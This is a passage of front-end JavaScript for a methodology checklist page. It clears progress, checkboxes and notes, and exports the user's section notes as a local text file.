        btn.classList.remove('done');
        btn.textContent = 'Mark Done';
      });
      document.querySelectorAll('.nav-link.completed').forEach(l => l.classList.remove('completed'));
      document.querySelectorAll('.checklist input[type="checkbox"]').forEach(cb => {
        cb.checked = false;
        const li = cb.closest('li');
        if (li) li.classList.remove('checked');
      });
      document.querySelectorAll('.section-notes textarea').forEach(ta => { ta.value = ''; });
      updateProgress();
      const resetSection = document.querySelector('.methodology-section');
      if (resetSection) showSection(resetSection.id);
      showToast('🗑️ Workspace cleared!');
    });

    btnRow.appendChild(clearBtn);

    const exportBtn = document.createElement('button');
    exportBtn.className = 'btn btn-blue';
    exportBtn.textContent = '📥 Export Notes';
    exportBtn.addEventListener('click', () => {
      const parts = [];
      document.querySelectorAll('.section-notes textarea').forEach(ta => {
        if (!ta.value.trim()) return;
        const sec = ta.closest('.methodology-section');
        const titleEl = sec ? sec.querySelector('.section-title') : null;
        const title = titleEl ? titleEl.textContent : 'Section';
        parts.push('== ' + title + ' ==\n\n' + ta.value.trim() + '\n\n---\n\n');
      });
      if (!parts.length) {
        showToast('📝 No notes to export!');
        return;
      }
      const blob = new Blob([parts.join('')], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'RV_U_Notes.txt';
      a.click();
      URL.revokeObjectURL(url);
    });
    btnRow.appendChild(exportBtn);

    container.appendChild(btnRow);
  }
});
